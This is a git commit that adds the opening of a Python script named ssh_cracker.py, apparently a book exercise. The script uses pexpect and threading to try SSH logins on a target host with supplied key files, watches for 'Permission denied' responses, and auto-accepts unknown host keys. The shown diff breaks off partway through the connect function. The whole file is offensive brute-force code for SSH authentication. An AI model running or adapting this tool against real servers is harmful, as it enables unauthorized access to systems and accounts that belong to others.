25f0596183ce09c36d9a49b3932b8d70c51fd781
fu477521 <fu477521@163.com>
2018-12-16 19:49:41 +0800

    add ssh_cracker

---
+++ ch2/ssh_cracker.py
@@ -0,0 +1,28 @@
+import pexpect
+import optparse
+import os
+from threading import *
+
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Stop = False
+Fails = 0
+
+def connect(user, host, keyfile, release):
+    global Stop
+    global Fails
+    try:
+        perm_denied = 'Permission denied'
+        ssh_newkey = 'Are you sure you want to continue'
+        conn_closed = 'Connection closed by remote host'
+        opt  = ' -o PasswordAuthentication=no'
+        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
+        child = pexpect.spawn(connStr)
+        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
+        conn_closed, '$', '#',])
+        if ret == 2:
+            print('[-] Adding Host to !/.ssh/known_hosts')
+            child.sendline('yes')
+            connect(user, host, keyfile, False)
+        elif ret == 3:
+            
